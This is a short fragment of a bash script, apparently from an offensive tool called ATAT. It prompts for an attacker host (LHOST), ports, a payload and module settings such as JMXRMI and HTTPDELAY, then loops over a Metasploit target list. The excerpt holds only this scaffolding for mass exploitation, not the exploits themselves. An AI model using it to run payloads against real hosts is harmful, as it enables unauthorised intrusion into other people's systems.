...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
